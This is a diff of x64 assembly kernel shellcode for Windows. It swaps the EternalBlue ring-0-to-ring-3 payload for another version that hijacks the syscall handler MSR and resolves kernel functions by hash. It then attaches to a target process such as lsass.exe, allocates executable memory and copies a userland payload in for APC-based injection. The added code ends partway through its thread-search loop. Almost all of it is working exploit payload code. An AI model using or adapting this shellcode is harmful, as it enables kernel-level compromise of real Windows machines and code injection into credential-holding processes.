@@ -1,625 +1,588 @@
-;
-; Windows x64 kernel shellcode from ring 0 to ring 3 by sleepya
-; The shellcode is written for eternalblue exploit: eternalblue_exploit7.py and eternalblue_exploit8.py
-;
-;
-; Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)
-;
-;
-; Note:
-; - The userland shellcode is run in a new thread of system process.
-;     If userland shellcode causes any exception, the system process get killed.
-; - On idle target with multiple core processors, the hijacked system call might take a while (> 5 minutes) to 
-;     get call because system call is called on other processors.
-; - The shellcode do not allocate shadow stack if possible for minimal shellcode size.
-;     It is ok because some Windows function does not require shadow stack.
-; - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.
-; - The userland payload MUST be appened to this shellcode.
-;
-; Reference:
-; - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)
-; - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c
 
 BITS 64
 ORG 0
-
-
-PSGETCURRENTPROCESS_HASH    EQU    0xdbf47c78
-PSGETPROCESSID_HASH    EQU    0x170114e1
-PSGETPROCESSIMAGEFILENAME_HASH    EQU    0x77645f3f
-LSASS_EXE_HASH    EQU    Process_Hash
-SPOOLSV_EXE_HASH    EQU    0x3ee083d8
-ZWALLOCATEVIRTUALMEMORY_HASH    EQU    0x576e99ea
-PSGETTHREADTEB_HASH    EQU    0xcef84c3e
-KEINITIALIZEAPC_HASH    EQU    0x6d195cc4
-KEINSERTQUEUEAPC_HASH    EQU    0xafcc4634
-PSGETPROCESSPEB_HASH    EQU    0xb818b848
-CREATETHREAD_HASH    EQU    0x835e515e
-
-
-
-DATA_PEB_ADDR_OFFSET        EQU -0x10
-DATA_QUEUEING_KAPC_OFFSET   EQU -0x8
-DATA_ORIGIN_SYSCALL_OFFSET  EQU 0x0
-DATA_NT_KERNEL_ADDR_OFFSET  EQU 0x8
-DATA_KAPC_OFFSET            EQU 0x10
+default rel
 
 section .text
-global shellcode_start
+global payload_start
 
-shellcode_start:
+; options which have set values
+%define PROCESS_HASH LSASS_EXE_HASH ; the process to queue APC into
+%define MAX_PID 0x10000
+%define WINDOWS_BUILD 7601            ; offsets appear relatively stable
 
-setup_syscall_hook:
-    ; IRQL is DISPATCH_LEVEL when got code execution
+; options which can be enabled
+%define USE_X86                       ; x86 payload
+%define USE_X64                       ; x64 payload
+;%define STATIC_ETHREAD_DELTA          ; use a pre-calculated ThreadListEntry
+%define ERROR_CHECKS                  ; lessen chance of BSOD, but bigger size
+%define SYSCALL_OVERWRITE             ; to run at process IRQL in syscall
+; %define CLEAR_DIRECTION_FLAG         ; if cld should be run
 
-%ifdef WIN7
-    mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument
-    ; set nByteProcessed to free corrupted buffer after return
-    mov ecx, [rdx+0x2c]
-    mov [rdx+0x38], ecx
-%elifdef WIN8
-    mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument
-    ; fix pool pointer (rcx is -0x8150 from controlled argument value)
-    add rcx, rdx
-    mov [rdx+0x30], rcx
-    ; set nByteProcessed to free corrupted buffer after return
-    mov ecx, [rdx+0x48]
-    mov [rdx+0x40], ecx
+; hashes for export directory lookups
+LSASS_EXE_HASH                    equ      Process_Hash   ; hash("lsass.exe")
+SPOOLSV_EXE_HASH                  equ      0xdd1f77bf   ; hash("spoolsv.exe")
+CREATETHREAD_HASH                 equ      0x221b4546   ; hash("CreateThread")
+PSGETCURRENTPROCESS_HASH          equ      0x6211725c   ; hash("PsGetCurrentProcess")
+PSLOOKUPPROCESSBYPROCESSID_HASH   equ      0x4ba25566   ; hash("PsLookupProcessByProcessId")
+PSGETPROCESSIMAGEFILENAME_HASH    equ      0x2d726fa3   ; hash("PsGetProcessImageFileName")
+PSGETTHREADTEB_HASH               equ      0x9d364026   ; hash("PsGetThreadTeb")
+KEGETCURRENTPROCESS_HASH          equ      0x5e91685c   ; hash("KeGetCurrentProcess")
+KEGETCURRENTTHREAD_HASH           equ      0x30a3ba7a   ; hash("KeGetCurrentThread")
+KEINITIALIZEAPC_HASH              equ      0x4b55ceac   ; hash("KeInitializeApc")
+KEINSERTQUEUEAPC_HASH             equ      0x9e093818   ; hash("KeInsertQueueApc")
+KESTACKATTACHPROCESS_HASH         equ      0xdc1124e5   ; hash("KeStackAttachProcess")
+KEUNSTACKDETACHPROCESS_HASH       equ      0x7db3b722   ; hash("KeUnstackDetachProcess")
+ZWALLOCATEVIRTUALMEMORY_HASH      equ      0xee0aca4b   ; hash("ZwAllocateVirtualMemory")
+EXALLOCATEPOOL_HASH               equ      0x9150ac26   ; hash("ExAllocatePool")
+OBDEREFERENCEOBJECT_HASH          equ      0x854de20d   ; hash("ObDereferenceObject")
+KERNEL32_DLL_HASH                 equ      0x92af16da   ; hash_U(L"kernel32.dll", len)
+
+; offsets for opaque structures
+%if WINDOWS_BUILD == 7601
+EPROCESS_THREADLISTHEAD_BLINK_OFFSET       equ     0x308
+ETHREAD_ALERTABLE_OFFSET                   equ     0x4c
+TEB_ACTIVATIONCONTEXTSTACKPOINTER_OFFSET   equ     0x2c8   ; ActivationContextStackPointer : Ptr64 _ACTIVATION_CONTEXT_STACK
+ETHREAD_THREADLISTENTRY_OFFSET             equ     0x420   ; only used if STATIC_ETHREAD_DELTA defined
 %endif
-    
-    push rbp
-    
-    call set_rbp_data_address_fn
-    
-    ; read current syscall
-    mov ecx, 0xc0000082
-    rdmsr
-    ; do NOT replace saved original syscall address with hook syscall
-    lea r9, [rel syscall_hook]
-    cmp eax, r9d
-    je _setup_syscall_hook_done
-    
-    ; if (saved_original_syscall != &KiSystemCall64) do_first_time_initialize
-    cmp dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET], eax
-    je _hook_syscall
-    
-    ; save original syscall
-    mov dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET+4], edx
-    mov dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET], eax
-    
-    ; first time on the target
-    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], 0
 
-_hook_syscall:
-    ; set a new syscall on running processor
-    ; setting MSR 0xc0000082 affects only running processor
-    xchg r9, rax
-    push rax
-    pop rdx     ; mov rdx, rax
-    shr rdx, 32
-    wrmsr
-    
-_setup_syscall_hook_done:
-    pop rbp
-    
-%ifdef WIN7
-    xor eax, eax
-%elifdef WIN8
-    xor eax, eax
-%endif
-    ret
+; now the shellcode begins
+payload_start:
+  xor ecx, ecx
+  db 0x41                   ; x86 = inc ecx, x64 = rex prefix
+  loop x64_payload_start    ; dec ecx, jnz. i.e. in x64 ecx = -1, we will now jmp
 
-;========================================================================
-; Find memory address in HAL heap for using as data area
-; Return: rbp = data address
-;========================================================================
-set_rbp_data_address_fn:
-    ; On idle target without user application, syscall on hijacked processor might not be called immediately.
-    ; Find some address to store the data, the data in this address MUST not be modified
-    ;   when exploit is rerun before syscall is called
-    lea rbp, [rel _set_rbp_data_address_fn_next + 0x1000]
-_set_rbp_data_address_fn_next:
-    shr rbp, 12
-    shl rbp, 12
-    sub rbp, 0x70   ; for KAPC struct too
-    ret
+BITS 32
 
-
-syscall_hook:
-    swapgs
-    mov qword [gs:0x10], rsp
-    mov rsp, qword [gs:0x1a8]
-    push 0x2b
-    push qword [gs:0x10]
-    
-    push rax    ; want this stack space to store original syscall addr
-    ; save rax first to make this function continue to real syscall
-    push rax
-    push rbp    ; save rbp here because rbp is special register for accessing this shellcode data
-    call set_rbp_data_address_fn
-    mov rax, [rbp+DATA_ORIGIN_SYSCALL_OFFSET]
-    add rax, 0x1f   ; adjust syscall entry, so we do not need to reverse start of syscall handler
-    mov [rsp+0x10], rax
-
-    ; save all volatile registers
-    push rcx
-    push rdx
-    push r8
-    push r9
-    push r10
-    push r11
-    
-    ; use lock cmpxchg for queueing APC only one at a time
-    xor eax, eax
-    mov dl, 1
-    lock cmpxchg byte [rbp+DATA_QUEUEING_KAPC_OFFSET], dl
-    jnz _syscall_hook_done
-
-    ;======================================
-    ; restore syscall
-    ;======================================
-    ; an error after restoring syscall should never occur
-    mov ecx, 0xc0000082
-    mov eax, [rbp+DATA_ORIGIN_SYSCALL_OFFSET]
-    mov edx, [rbp+DATA_ORIGIN_SYSCALL_OFFSET+4]
-    wrmsr
-    
-    ; allow interrupts while executing shellcode
-    sti
-    call r3_to_r0_start
-    cli
-    
-_syscall_hook_done:
-    pop r11
-    pop r10
-    pop r9
-    pop r8
-    pop rdx
-    pop rcx
-    pop rbp
-    pop rax
-    ret
-
-r3_to_r0_start:
-    ; save used non-volatile registers
-    push r15
-    push r14
-    push rdi
-    push rsi
-    push rbx
-    push rax    ; align stack by 0x10
-
-    ;======================================
-    ; find nt kernel address
-    ;======================================
-    mov r15, qword [rbp+DATA_ORIGIN_SYSCALL_OFFSET]      ; KiSystemCall64 is an address in nt kernel
-    shr r15, 0xc                ; strip to page size
-    shl r15, 0xc
-
-_x64_find_nt_walk_page:
-    sub r15, 0x1000             ; walk along page size
-    cmp word [r15], 0x5a4d      ; 'MZ' header
-    jne _x64_find_nt_walk_page
-    
-    ; save nt address for using in KernelApcRoutine
-    mov [rbp+DATA_NT_KERNEL_ADDR_OFFSET], r15
-
-    ;======================================
-    ; get current EPROCESS and ETHREAD
-    ;======================================
-    mov r14, qword [gs:0x188]    ; get _ETHREAD pointer from KPCR
-    mov edi, PSGETCURRENTPROCESS_HASH
-    call win_api_direct
-    xchg rcx, rax       ; rcx = EPROCESS
-    
-    ; r15 : nt kernel address
-    ; r14 : ETHREAD
-    ; rcx : EPROCESS    
-    
-    ;======================================
-    ; find offset of EPROCESS.ImageFilename
-    ;======================================
-    mov edi, PSGETPROCESSIMAGEFILENAME_HASH
-    call get_proc_addr
-    mov eax, dword [rax+3]  ; get offset from code (offset of ImageFilename is always > 0x7f)
-    mov ebx, eax        ; ebx = offset of EPROCESS.ImageFilename
-
-
-    ;======================================
-    ; find offset of EPROCESS.ThreadListHead
-    ;======================================
-    ; possible diff from ImageFilename offset is 0x28 and 0x38 (Win8+)
-    ; if offset of ImageFilename is more than 0x400, current is (Win8+)
-%ifdef WIN7
-    lea rdx, [rax+0x28]
-%elifdef WIN8
-    lea rdx, [rax+0x38]
+%ifdef USE_X86
+  ret
 %else
-    cmp eax, 0x400      ; eax is still an offset of EPROCESS.ImageFilename
-    jb _find_eprocess_threadlist_offset_win7
-    add eax, 0x10
-_find_eprocess_threadlist_offset_win7:
-    lea rdx, [rax+0x28] ; edx = offset of EPROCESS.ThreadListHead
+  ret
 %endif
 
-    
-    ;======================================
-    ; find offset of ETHREAD.ThreadListEntry
-    ;======================================
-%ifdef COMPACT
-    lea r9, [rcx+rdx]   ; r9 = ETHREAD listEntry
+x64_payload_start:
+BITS 64
+
+%ifdef SYSCALL_OVERWRITE
+x64_syscall_overwrite:
+  mov ecx, 0xc0000082                               ; IA32_LSTAR syscall MSR
+  rdmsr
+  ;movabs rbx, 0xffffffffffd00ff8
+  db 0x48, 0xbb, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
+  mov dword [rbx+0x4], edx                          ; save old syscall handler
+  mov dword [rbx], eax
+  lea rax, [rel x64_syscall_handler]                ; load new syscall handler
+  mov rdx, rax
+  shr rdx, 0x20
+
+  wrmsr
+  ret
+
+x64_syscall_handler:
+  swapgs
+  mov qword [gs:0x10], rsp
+  mov rsp, qword [gs:0x1a8]
+
+  push rax
+  push rbx
+  push rcx
+  push rdx
+  push rsi
+  push rdi
+  push rbp
+  push r8
+  push r9
+  push r10
+  push r11
+  push r12
+  push r13
+  push r14
+  push r15
+
+  push 0x2b
+  push qword [gs:0x10]
+  push r11
+  push 0x33
+  push rcx
+  mov rcx, r10
+  sub rsp, 0x8
+  push rbp
+  sub rsp, 0x158
+  lea rbp, [rsp + 0x80]
+
+  mov qword [rbp+0xc0],rbx
+  mov qword [rbp+0xc8],rdi
+  mov qword [rbp+0xd0],rsi
+
+  ;movabs rax, 0xffffffffffd00ff8
+  db 0x48, 0xa1, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
+
+  mov rdx, rax
+  shr rdx, 0x20
+  xor rbx, rbx
+  dec ebx
+  and rax, rbx
+  mov ecx, 0xc0000082
+  wrmsr
+  sti
+
+  call x64_kernel_start
+
+  cli
+  mov rsp, qword [abs gs:0x1a8]
+  sub rsp, 0x78
+  pop r15
+  pop r14
+  pop r13
+  pop r12
+  pop r11
+  pop r10
+  pop r9
+  pop r8
+  pop rbp
+  pop rdi
+  pop rsi
+  pop rdx
+  pop rcx
+  pop rbx
+  pop rax
+  mov rsp, qword [abs gs:0x10]
+  swapgs
+  jmp [0xffffffffffd00ff8]
+
+; SYSCALL_OVERWRITE
+%endif
+
+x64_kernel_start:
+; Some "globals", which should not be clobbered, these are also ABI non-volatile
+; ----------------------------------------------
+; r15 = ntoskrnl.exe base address (DOS MZ header)
+; r14 = &x64_kernel_start
+; r13 = PKAPC_STATE
+; rbx = PID/PEPROCESS
+; r12 = ThreadListEntry offset, later ETHREAD that is alertable
+; rbp = current rsp
+
+%ifdef CLEAR_DIRECTION_FLAG
+  cld
+%endif
+  ; we will restore non-volatile registers
+  push rsi                                          ; save clobbered registers
+  push r15                                          ; r15 = ntoskernl.exe
+  push r14                                          ; r14 = &x64_kernel_start
+  push r13                                          ; r13 = PKAPC_STATE
+  push r12                                          ; r12 = ETHREAD/offsets
+  push rbx                                          ; rbx = PID/EPROCESS
+
+  push rbp
+
+  mov rbp, rsp                                      ; we'll use the base pointer
+  and sp, 0xFFF0                                    ; align stack to ABI boundary
+  sub rsp, 0x20                                     ; reserve shadow stack
+
+  lea r14, [rel x64_kernel_start]                   ; for use in pointers
+
+; this stub loads ntoskrnl.exe into r15
+x64_find_nt_idt:
+  mov r15, qword [gs:0x38]                          ; get IdtBase of KPCR
+  mov r15, qword [r15 + 0x4]                        ; get ISR address
+  shr r15, 0xc                                      ; strip to page size
+  shl r15, 0xc
+
+_x64_find_nt_idt_walk_page:
+  sub r15, 0x1000                                   ; walk along page size
+  mov rsi, qword [r15]
+  cmp si, 0x5a4d                                    ; 'MZ' header
+  jne _x64_find_nt_idt_walk_page
+
+; dynamically finds the offset to ETHREAD.ThreadListEntry
+find_threadlistentry_offset:
+
+%ifdef STATIC_ETHREAD_DELTA
+  mov r12, ETHREAD_THREADLISTENTRY_OFFSET
 %else
-    lea r8, [rcx+rdx]   ; r8 = address of EPROCESS.ThreadListHead
-    mov r9, r8
-%endif
-    ; ETHREAD.ThreadListEntry must be between ETHREAD (r14) and ETHREAD+0x700
-_find_ethread_threadlist_offset_loop:
-    mov r9, qword [r9]
-%ifndef COMPACT
-    cmp r8, r9          ; check end of list
-    je _insert_queue_apc_done    ; not found !!!
-%endif
-    ; if (r9 - r14 < 0x700) found
-    mov rax, r9
-    sub rax, r14
-    cmp rax, 0x700
-    ja _find_ethread_threadlist_offset_loop
-    sub r14, r9         ; r14 = -(offset of ETHREAD.ThreadListEntry)
+  mov r11d, PSGETCURRENTPROCESS_HASH
+  call x64_block_api_direct
 
+  mov rsi, rax
+  add rsi, EPROCESS_THREADLISTHEAD_BLINK_OFFSET      ; PEPROCESS->ThreadListHead
 
-    ;======================================
-    ; find offset of EPROCESS.ActiveProcessLinks
-    ;======================================
-    mov edi, PSGETPROCESSID_HASH
-    call get_proc_addr
-    mov edi, dword [rax+3]  ; get offset from code (offset of UniqueProcessId is always > 0x7f)
-    add edi, 8      ; edi = offset of EPROCESS.ActiveProcessLinks = offset of EPROCESS.UniqueProcessId + sizeof(EPROCESS.UniqueProcessId)
-    
+  mov r11d, KEGETCURRENTTHREAD_HASH
+  call x64_block_api_direct
 
-    ;======================================
-    ; find target process by iterating over EPROCESS.ActiveProcessLinks WITHOUT lock 
-    ;======================================
-    ; check process name
-_find_target_process_loop:
-    lea rsi, [rcx+rbx]
-    call calc_hash
-    cmp eax, LSASS_EXE_HASH    ; "lsass.exe"
-%ifndef COMPACT
-    jz found_target_process
-    cmp eax, SPOOLSV_EXE_HASH  ; "spoolsv.exe"
-%endif
-    jz found_target_process
-    ; next process
-    mov rcx, [rcx+rdi]
-    sub rcx, rdi
-    jmp _find_target_process_loop
+  mov rcx, rsi                                       ; save ThreadListHead
 
+_find_threadlistentry_offset_compare_threads:
+  cmp rax, rsi
+  ja _find_threadlistentry_offset_walk_threads
+  lea rdx, [rax + 0x500]
+  cmp rdx, rsi
+  jb _find_threadlistentry_offset_walk_threads
+  sub rsi, rax
+  jmp _find_threadlistentry_offset_calc_thread_exit
 
-found_target_process:
-    ; The allocation for userland payload will be in KernelApcRoutine.
-    ; KernelApcRoutine is run in a target process context. So no need to use KeStackAttachProcess()
+_find_threadlistentry_offset_walk_threads:
+  mov rsi, qword [rsi]                    ; move up the list entries
+  cmp rsi, rcx                            ; make sure we exit this loop at some point
+  jne _find_threadlistentry_offset_compare_threads
 
-    ;======================================
-    ; save process PEB for finding CreateThread address in kernel KAPC routine
-    ;======================================
-    mov edi, PSGETPROCESSPEB_HASH
-    ; rcx is EPROCESS. no need to set it.
-    call win_api_direct
-    mov [rbp+DATA_PEB_ADDR_OFFSET], rax
-    
-    
-    ;======================================
-    ; iterate ThreadList until KeInsertQueueApc() success
-    ;======================================
-    ; r15 = nt
-    ; r14 = -(offset of ETHREAD.ThreadListEntry)
-    ; rcx = EPROCESS
-    ; edx = offset of EPROCESS.ThreadListHead
-
-%ifdef COMPACT
-    lea rbx, [rcx + rdx]
-%else
-    lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address
-    mov rbx, rsi    ; use rbx for iterating thread
+_find_threadlistentry_offset_calc_thread_exit:
+  mov r12, rsi
 %endif
 
+; now we need to find the EPROCESS to inject into
+x64_find_process_name:
+  xor ebx, ebx
 
-    ; checking alertable from ETHREAD structure is not reliable because each Windows version has different offset.
-    ; Moreover, alertable thread need to be waiting state which is more difficult to check.
-    ; try queueing APC then check KAPC member is more reliable.
-
-_insert_queue_apc_loop:
-    ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front
-    mov rbx, [rbx+8]
-%ifndef COMPACT
-    cmp rsi, rbx
-    je _insert_queue_apc_loop   ; skip list head
+_x64_find_process_name_loop_pid:
+  mov ecx, ebx
+  add ecx, 0x4
+%ifdef MAX_PID
+  cmp ecx, MAX_PID
+  jge x64_kernel_exit
 %endif
 
-    ; find start of ETHREAD address
-    ; set it to rdx to be used for KeInitializeApc() argument too
-    lea rdx, [rbx + r14]    ; ETHREAD
-    
-    ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.
-    ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.
-    ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.
-    ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.
-    ; Teb member is next to Queue member.
-    mov edi, PSGETTHREADTEB_HASH
-    call get_proc_addr
-    mov eax, dword [rax+3]      ; get offset from code (offset of Teb is always > 0x7f)
-    cmp qword [rdx+rax-8], 0    ; KTHREAD.Queue MUST not be NULL
-    je _insert_queue_apc_loop
-    
-    ; KeInitializeApc(PKAPC,
-    ;                 PKTHREAD,
-    ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),
-    ;                 PKKERNEL_ROUTINE = kernel_apc_routine,
-    ;                 PKRUNDOWN_ROUTINE = NULL,
-    ;                 PKNORMAL_ROUTINE = userland_shellcode,
-    ;                 KPROCESSOR_MODE = UserMode (1),
-    ;                 PVOID Context);
-    lea rcx, [rbp+DATA_KAPC_OFFSET]     ; PAKC
-    xor r8, r8      ; OriginalApcEnvironment
-    lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine
-    push rbp    ; context
-    push 1      ; UserMode
-    push rbp    ; userland shellcode (MUST NOT be NULL)
-    push r8     ; NULL
-    sub rsp, 0x20   ; shadow stack
-    mov edi, KEINITIALIZEAPC_HASH
-    call win_api_direct
-    ; Note: KeInsertQueueApc() requires shadow stack. Adjust stack back later
+  mov rdx, r14                                      ; PEPROCESS*
+  mov ebx, ecx                                      ; save current PID
 
-    ; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);
-    ;   SystemArgument1 is second argument in usermode code (rdx)
-    ;   SystemArgument2 is third argument in usermode code (r8)
-    lea rcx, [rbp+DATA_KAPC_OFFSET]
-    ;xor edx, edx   ; no need to set it here
-    ;xor r8, r8     ; no need to set it here
-    xor r9, r9
-    mov edi, KEINSERTQUEUEAPC_HASH
-    call win_api_direct
-    add rsp, 0x40
-    ; if insertion failed, try next thread
-    test eax, eax
-    jz _insert_queue_apc_loop
-    
-    mov rax, [rbp+DATA_KAPC_OFFSET+0x10]     ; get KAPC.ApcListEntry
-    ; EPROCESS pointer 8 bytes
-    ; InProgressFlags 1 byte
-    ; KernelApcPending 1 byte
-    ; if success, UserApcPending MUST be 1
-    cmp byte [rax+0x1a], 1
-    je _insert_queue_apc_done
-    
-    ; manual remove list without lock
-    mov [rax], rax
-    mov [rax+8], rax
-    jmp _insert_queue_apc_loop
+  ; PsLookupProcessById(dwPID, &x64_kernel_start);
+  mov r11d, PSLOOKUPPROCESSBYPROCESSID_HASH
+  call x64_block_api_direct
 
-_insert_queue_apc_done:
-    ; The PEB address is needed in kernel_apc_routine. Setting QUEUEING_KAPC to 0 should be in kernel_apc_routine.
+  test eax, eax                                     ; see if STATUS_SUCCESS
+  jnz _x64_find_process_name_loop_pid
 
-_r3_to_r0_done:
-    pop rax
-    pop rbx
-    pop rsi
-    pop rdi
-    pop r14
-    pop r15
-    ret
+  mov rcx, [r14]                                    ; rcx = *PEPROCESS
 
-;========================================================================
-; Call function in specific module
-; 
-; All function arguments are passed as calling normal function with extra register arguments
-; Extra Arguments: r15 = module pointer
-;                  edi = hash of target function name
-;========================================================================
-win_api_direct:
-    call get_proc_addr
-    jmp rax
+  ; PsGetProcessImageFileName(*(&x64_kernel_start));
+  mov r11d, PSGETPROCESSIMAGEFILENAME_HASH
+  call x64_block_api_direct
 
+  mov rsi, rax
+  call x64_calc_hash
 
-;========================================================================
-; Get function address in specific module
-; 
-; Arguments: r15 = module pointer
-;            edi = hash of target function name
-; Return: eax = offset
-;========================================================================
-get_proc_addr:
-    ; Save registers
-    push rbx
-    push rcx
-    push rsi                ; for using calc_hash
+  cmp r9d, PROCESS_HASH
 
-    ; use rax to find EAT
-    mov eax, dword [r15+60]  ; Get PE header e_lfanew
-    mov eax, dword [r15+rax+136] ; Get export tables RVA
+  jne _x64_find_process_name_loop_pid
 
-    add rax, r15
-    push rax                 ; save EAT
+x64_attach_process:
+  mov rbx, [r14]                          ; r14 = EPROCESS
 
-    mov ecx, dword [rax+24]  ; NumberOfFunctions
-    mov ebx, dword [rax+32]  ; FunctionNames
-    add rbx, r15
+  lea r13, [r14 + 16]
+  mov rdx, r13                            ; rdx = (PRKAPC_STATE)&x64_kernel_start + 16
+  mov rcx, rbx                            ; rcx = PEPROCESS
 
-_get_proc_addr_get_next_func:
-    ; When we reach the start of the EAT (we search backwards), we hang or crash
-    dec ecx                     ; decrement NumberOfFunctions
-    mov esi, dword [rbx+rcx*4]  ; Get rva of next module name
-    add rsi, r15                ; Add the modules base address
+  ; KeStackAttachProcess(PEPROCESS, &x64_kernel_start + 16);
+  mov r11d, KESTACKATTACHPROCESS_HASH
+  call x64_block_api_direct
 
-    call calc_hash
+  ; ZwAllocateVirtualMemory
+  push 0x40                                   ; PAGE_EXECUTE_READWRITE
+  push 0x1000                                 ; AllocationType
 
-    cmp eax, edi                        ; Compare the hashes
-    jnz _get_proc_addr_get_next_func    ; try the next function
+  lea r9, [r14 + 8]                           ; r9 = pRegionSize
+  mov qword [r9], 0x1000                      ; *pRegionSize = 0x1000
 
-_get_proc_addr_finish:
-    pop rax                     ; restore EAT
-    mov ebx, dword [rax+36]
-    add rbx, r15                ; ordinate table virtual address
-    mov cx, word [rbx+rcx*2]    ; desired functions ordinal
-    mov ebx, dword [rax+28]     ; Get the function addresses table rva
-    add rbx, r15                ; Add the modules base address
-    mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA
-    add rax, r15                ; Add the modules base address to get the functions actual VA
+  xor r8, r8                                  ; ZeroBits = 0
+  mov rdx, r14                                ; rdx = BaseAddress
+  xor ecx, ecx
+  mov qword [rdx], rcx                        ; set *BaseAddress = NULL
+  not rcx                                     ; rcx = 0xffffffffffffffff
 
-    pop rsi
-    pop rcx
-    pop rbx
-    ret
+  ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, 0x1000, 0x1000, 0x40);
+  mov r11d, ZWALLOCATEVIRTUALMEMORY_HASH
+  sub rsp, 0x20                               ; we have to reserve new shadow stack
+  call x64_block_api_direct
 
-;========================================================================
-; Calculate ASCII string hash. Useful for comparing ASCII string in shellcode.
-; 
-; Argument: rsi = string to hash
-; Clobber: rsi
-; Return: eax = hash
-;========================================================================
-calc_hash:
-    push rdx
-    xor eax, eax
-    cdq
-_calc_hash_loop:
-    lodsb                   ; Read in the next byte of the ASCII string
-    ror edx, 13             ; Rotate right our hash value
-    add edx, eax            ; Add the next byte of the string
-    test eax, eax           ; Stop when found NULL
-    jne _calc_hash_loop
-    xchg edx, eax
-    pop rdx
-    ret
-
-
-; KernelApcRoutine is called when IRQL is APC_LEVEL in (queued) Process context.
-; But the IRQL is simply raised from PASSIVE_LEVEL in KiCheckForKernelApcDelivery().
-; Moreover, there is no lock when calling KernelApcRoutine.
-; So KernelApcRoutine can simply lower the IRQL by setting cr8 register.
-;
-; VOID KernelApcRoutine(
-;           IN PKAPC Apc,
-;           IN PKNORMAL_ROUTINE *NormalRoutine,
-;           IN PVOID *NormalContext,
-;           IN PVOID *SystemArgument1,
-;           IN PVOID *SystemArgument2)
-kernel_kapc_routine:
-    push rbp
-    push rbx
-    push rdi
-    push rsi
-    push r15
-    
-    mov rbp, [r8]       ; *NormalContext is our data area pointer
-        
-    mov r15, [rbp+DATA_NT_KERNEL_ADDR_OFFSET]
-    push rdx
-    pop rsi     ; mov rsi, rdx
-    mov rbx, r9
-    
-    ;======================================
-    ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, &0x1000, 0x1000, 0x40)
-    ;======================================
-    xor eax, eax
-    mov cr8, rax    ; set IRQL to PASSIVE_LEVEL (ZwAllocateVirtualMemory() requires)
-    ; rdx is already address of baseAddr
-    mov [rdx], rax      ; baseAddr = 0
-    mov ecx, eax
-    not rcx             ; ProcessHandle = -1
-    mov r8, rax         ; ZeroBits
-    mov al, 0x40    ; eax = 0x40
-    push rax            ; PAGE_EXECUTE_READWRITE = 0x40
-    shl eax, 6      ; eax = 0x40 << 6 = 0x1000
-    push rax            ; MEM_COMMIT = 0x1000
-    ; reuse r9 for address of RegionSize
-    mov [r9], rax       ; RegionSize = 0x1000
-    sub rsp, 0x20   ; shadow stack
-    mov edi, ZWALLOCATEVIRTUALMEMORY_HASH
-    call win_api_direct
-    add rsp, 0x30
-%ifndef COMPACT
-    ; check error
-    test eax, eax
-    jnz _kernel_kapc_routine_exit
-%endif
-    
-    ;======================================
-    ; copy userland payload
-    ;======================================
-    mov rdi, [rsi]
-    lea rsi, [rel userland_start]
-    mov ecx, 0x600  ; fix payload size to 1536 bytes
-    rep movsb
-    
-    ;======================================
-    ; find CreateThread address (in kernel32.dll)
-    ;======================================
-    mov rax, [rbp+DATA_PEB_ADDR_OFFSET]
-    mov rax, [rax + 0x18]       ; PEB->Ldr
-    mov rax, [rax + 0x20]       ; InMemoryOrder list
-
-%ifdef COMPACT
-    mov rsi, [rax]      ; first one always be executable, skip it
-    lodsq               ; skip ntdll.dll
-%else
-_find_kernel32_dll_loop:
-    mov rax, [rax]       ; first one always be executable
-    ; offset 0x38 (WORD)  => must be 0x40 (full name len c:\windows\system32\kernel32.dll)
-    ; offset 0x48 (WORD)  => must be 0x18 (name len kernel32.dll)
-    ; offset 0x50  => is name
-    ; offset 0x20  => is dllbase
-    ;cmp word [rax+0x38], 0x40
-    ;jne _find_kernel32_dll_loop
-    cmp word [rax+0x48], 0x18
-    jne _find_kernel32_dll_loop
-    
-    mov rdx, [rax+0x50]
-    ; check only "32" because name might be lowercase or uppercase
-    cmp dword [rdx+0xc], 0x00320033   ; 3\x002\x00
-    jnz _find_kernel32_dll_loop
+%ifdef ERROR_CHECKS
+  test eax, eax
+  jnz x64_kernel_exit_cleanup
 %endif
 
-    mov r15, [rax+0x20]
-    mov edi, CREATETHREAD_HASH
-    call get_proc_addr
+; rep movs kernel -> userland
+x64_memcpy_userland_payload:
+  mov rdi, [r14]
+  lea rsi, [rel userland_start]
+  xor ecx, ecx
+  add cx, word [rel userland_payload_size]              ; size of payload userland
+  add cx, userland_payload - userland_start             ; size of our userland
+  rep movsb
 
-    ; save CreateThread address to SystemArgument1
-    mov [rbx], rax
-    
-_kernel_kapc_routine_exit:
-    xor ecx, ecx
-    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
-    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], cl
-    ; restore IRQL to APC_LEVEL
-    mov cl, 1
-    mov cr8, rcx
-    
-    pop r15
-    pop rsi
-    pop rdi
-    pop rbx
-    pop rbp
-    ret
+; Teb loop to find an alertable thread
+x64_find_alertable_thread:
+  mov rsi, rbx                                          ; rsi = EPROCESS
+  add rsi, EPROCESS_THREADLISTHEAD_BLINK_OFFSET         ; rsi = EPROCESS.ThreadListHead.Blink
 
-  
+  mov rcx, rsi                                          ; save the head pointer
+
+_x64_find_alertable_thread_loop:
+  mov rdx, [rcx]
+
+%ifdef ERROR_CHECKS
+;  todo: don't cmp on first element
+;  cmp rsi, rcx
+;  je x64_kernel_exit_cleanup
+%endif
+
